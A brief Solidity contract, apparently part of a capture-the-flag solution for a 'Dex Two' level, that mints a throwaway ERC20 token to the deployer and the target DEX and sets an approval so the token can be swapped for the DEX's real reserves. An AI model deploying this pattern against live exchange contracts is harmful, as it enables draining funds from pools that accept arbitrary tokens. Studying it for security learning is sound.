// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
    constructor(address _targetAddress) ERC20("DexTwoAttack", "DTA") {
        address owner = msg.sender;
        address dex = _targetAddress;

        _mint(owner, 1000);
        _mint(dex, 100);
        super._approve(owner, dex, 1000);
    }
}
